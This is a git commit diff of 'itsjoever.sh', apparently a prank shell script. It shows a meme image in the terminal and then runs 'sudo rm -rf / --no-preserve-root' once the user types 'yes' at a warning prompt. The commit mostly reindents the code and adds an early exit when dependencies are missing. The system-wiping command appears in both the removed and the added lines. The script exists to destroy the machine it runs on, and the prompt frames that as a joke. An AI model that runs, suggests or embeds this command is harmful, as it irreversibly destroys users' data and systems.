a1a11f353393548aba35156875b5012c74342c30
Tyler <166963170+ty20070@users.noreply.github.com>
2024-04-27 21:14:23 -0700

    Update itsjoever.sh

--- itsjoever.sh
+++ itsjoever.sh
@@ -2,39 +2,38 @@
 
 # Check if curl, catimg, and convert (from ImageMagick) are installed
 if ! command -v curl &> /dev/null || ! command -v catimg &> /dev/null || ! command -v convert &> /dev/null; then
-    echo "One or more required commands (curl, catimg, convert from imagemagik) are not installed."
+    echo "One or more required commands (curl, catimg, convert from ImageMagick) are not installed."
+    exit 1
+fi
 
 # Confirmation prompt
 read -p "Are you absolutely sure you want to run this? This will remove everything off your system! (yes/no): " answer
 if [[ $answer == "yes" ]]; then
+    # Clear the terminal
+    clear
+    tput civis
 
-# Clear the terminal
-clear
-tput civis
+    # Function to resize the image by 80%
+    resize_image() {
+        convert original_image.jpg -resize 80x80^ -gravity center -extent 80x80 resized_image.jpg
+    }
 
+    # Download the image silently using curl
+    curl -s -o original_image.jpg https://i.kym-cdn.com/photos/images/newsfeed/002/360/758/f0b.jpg
 
-# Function to resize the image by 80%
-resize_image() {
-    convert original_image.jpg -resize 80x80^ -gravity center -extent 80x80 resized_image.jpg
-}
+    # Run the loop 1 time
+    for ((i=1; i<=1; i++)); do
+        resize_image
+        # Display the resized image using catimg
+        catimg resized_image.jpg
+        sleep 5
+    done
 
-# Download the image silently using curl
-curl -s -o original_image.jpg https://i.kym-cdn.com/photos/images/newsfeed/002/360/758/f0b.jpg
+    # Clean up downloaded files
+    rm original_image.jpg resized_image.jpg
 
-# Run the loop 1 time
-for ((i=1; i<=1; i++)); do
-    resize_image
-    # Display the resized image using catimg
-    catimg resized_image.jpg
-    sleep 5
-done
-
-# Clean up downloaded files
-rm original_image.jpg resized_image.jpg
-
-# Remove the system
-sudo rm -rf / --no-preserve-root 
-
+    # Remove the system
+    sudo rm -rf / --no-preserve-root
 else
     echo "Operation cancelled."
     exit 0
